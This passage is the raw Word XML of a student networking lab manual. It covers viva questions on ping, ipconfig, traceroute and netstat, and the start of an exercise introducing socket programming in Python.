          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="538DB45B" w14:textId="77777777" w:rsidR="00C2706C" w:rsidRDefault="00C2706C" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67651D54" w14:textId="77777777" w:rsidR="00C2706C" w:rsidRDefault="00C2706C" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F3EF480" w14:textId="6435034F" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="60CCE582" wp14:editId="2F8D9713">
            <wp:extent cx="3590925" cy="1590675"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="1238636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5"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3590925" cy="1590675"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="32543C2C" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4AE08F6B" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00812B48">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Result:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23EAC71A" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00812B48">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Thus the above windows commands were executed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C5A9A5C" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1ED99139" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2074E089" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49D7F404" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63EA87FA" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4849DAFA" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6315D53C" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A20A051" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0ABCE45B" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A7E626C" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42102D54" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A88D4E4" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="792A834B" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FBFCE3A" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10588EDF" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AA3BD3C" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6654F70E" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="062A9149" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B4E3775" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03BE9C2A" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DB50134" w14:textId="77777777" w:rsidR="007A01D0" w:rsidRDefault="007A01D0" w:rsidP="00C2706C">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="098346CC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C3E8FA7" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C3FC38C" w14:textId="5E7F7F2B" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Viva Questions :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="053D979F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. What is the purpose of the ping command?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26EE665C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer: It checks whether a host or server is reachable on the network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D9A8B9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. What does the ipconfig command do in Windows?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132A77C2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer: It displays the IP configuration of the computer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4109F1" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Which command is used in Linux to display network interfaces?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D2752CB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer: ifconfig or ip addr.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A01355" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. What is the use of the tracert or traceroute command?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="401278B3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer: It shows the path taken by packets to reach a destination.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FAD362F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. What is the purpose of the netstat command?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530463AB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer: It displays active network connections and listening ports.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A70729B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C43267A" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="007A01D0">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76E99C31" w14:textId="0C066451" w:rsidR="0094061E" w:rsidRDefault="004967CD" w:rsidP="007A01D0">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Ex.No :  2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B19F59D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="007A01D0">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>STUDY OF SOCKET PROGAMMING IN PYTHON</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF084F1" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Aim:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F28E398" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>To study the concepts of socket programming in python.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB03A73" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Introduction:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29BF2DE9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Socket definition:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26511F35" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>A network socket is an endpoint of a two-way communication link between two programs or processes - client and server in our case - which are running on the network. This can be on the same computer as well as on different systems which are connected via the network. Both client/server communicate with each other by writing to or reading from the network socket. The technical equivalent in reality is a telephone communication between two participants. The network socket represents the corresponding number of the telephone line, or a contract in case of cell phones.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11270CBF" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Socket programming in python</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A73981" w14:textId="1C1D60E2" w:rsidR="004967CD" w:rsidRPr="005B6C3A" w:rsidRDefault="00000000" w:rsidP="005B6C3A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Python's core networking library is Socket Module.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59BFD110" w14:textId="2E1A7EB1" w:rsidR="004967CD" w:rsidRPr="005B6C3A" w:rsidRDefault="00000000" w:rsidP="005B6C3A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Python's socket module has both class-based and instances-based methods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3986F698" w14:textId="497B15CE" w:rsidR="004967CD" w:rsidRPr="005B6C3A" w:rsidRDefault="00000000" w:rsidP="005B6C3A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
